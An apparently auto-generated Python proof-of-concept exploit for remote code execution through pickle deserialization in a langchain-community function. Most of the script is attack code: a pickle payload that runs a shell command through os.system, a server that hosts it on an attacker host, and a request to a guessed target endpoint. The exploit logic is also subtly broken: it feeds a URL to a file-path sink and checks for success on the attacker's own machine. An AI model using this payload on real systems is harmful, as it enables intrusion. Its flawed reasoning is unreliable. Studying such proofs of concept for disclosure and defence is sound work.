#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_if_string_opens_calls__send_pipeline_to_device_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only.

Vulnerability: The function _send_pipeline_to_device in
langchain_community/llms/self_hosted.py accepts a 'pipeline' parameter.
If it is a string, it opens the file and calls pickle.load on its contents.
An attacker who can control the 'pipeline' parameter can provide a path to a
malicious pickle file, leading to arbitrary code execution.

This PoC:
1. Creates a malicious pickle file that executes a benign command
   (touch /tmp/poc_success.txt).
2. Hosts it on a local HTTP server (or uses a provided URL).
3. Sends a request to the target endpoint that triggers the vulnerable
   function with the path to the malicious pickle file.

Usage:
    python3 poc.py --target http://victim:8000/api/v1/trigger --payload-url http://attacker:9999/malicious.pkl
    python3 poc.py --target http://victim:8000/api/v1/trigger --local  # hosts payload locally
"""

import argparse
import http.server
import os
import pickle
import requests
import socket
import subprocess
import sys
import threading
import time

# =============================================================================
# Step 1: Create a malicious pickle payload
# =============================================================================

class MaliciousPickle:
    """A class whose __reduce__ method returns a command to execute."""
    def __reduce__(self):
        # Benign command: create a marker file
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_pickle(filepath: str):
    """Serialize a MaliciousPickle object to a file."""
    payload = MaliciousPickle()
    with open(filepath, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Malicious pickle created at: {filepath}")

# =============================================================================
# Step 2: Host the payload (if using --local)
# =============================================================================

def start_local_server(port: int, payload_path: str):
    """Start a simple HTTP server to serve the malicious pickle file."""
    directory = os.path.dirname(os.path.abspath(payload_path))
    filename = os.path.basename(payload_path)

    handler = http.server.SimpleHTTPRequestHandler
    httpd = http.server.HTTPServer(("0.0.0.0", port), handler)
    print(f"[+] Serving payload at http://0.0.0.0:{port}/{filename}")
    httpd.serve_forever()

def get_local_ip():
    """Get the local IP address (best effort)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't need to be reachable
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# =============================================================================
# Step 3: Send the exploit request
# =============================================================================

def send_exploit(target_url: str, payload_url: str):
    """
    Send a POST request to the target endpoint with the malicious pickle path.
    Assumes the endpoint accepts a 'pipeline' parameter (or similar).
    Adjust the parameter name if needed based on the actual API.
    """
    print(f"[*] Sending exploit to {target_url}")
    print(f"[*] Payload URL: {payload_url}")

    # The vulnerable function expects a string (file path).
    # We provide the URL to the malicious pickle file.
    # In a real scenario, the attacker might upload the file first or use a
    # network share. Here we assume the target can access the payload URL.
    data = {"pipeline": payload_url}

    try:
        response = requests.post(target_url, json=data, timeout=10)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Is the target reachable?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(description="PoC for langchain-community RCE")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://victim:8000/api/v1/trigger)")
    parser.add_argument("--payload-url", help="URL to the malicious pickle file (if not using --local)")
    parser.add_argument("--local", action="store_true", help="Host the payload locally")
    parser.add_argument("--port", type=int, default=9999, help="Local server port (default: 9999)")
    args = parser.parse_args()

    # Create the malicious pickle file
    payload_file = "/tmp/malicious.pkl"
    create_malicious_pickle(payload_file)

    if args.local:
        # Start local server in a background thread
        server_thread = threading.Thread(
            target=start_local_server, args=(args.port, payload_file), daemon=True
        )
        server_thread.start()
        time.sleep(0.5)  # Give server time to start

        local_ip = get_local_ip()
        payload_url = f"http://{local_ip}:{args.port}/malicious.pkl"
    elif args.payload_url:
        payload_url = args.payload_url
    else:
        print("[-] Either --local or --payload-url must be provided.")
        sys.exit(1)

    # Send the exploit
    send_exploit(args.target, payload_url)

    # Check if the command executed (optional)
    time.sleep(1)
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt created — RCE confirmed!")
    else:
        print("[?] Could not verify execution. Check the target manually.")

if __name__ == "__main__":
    main()
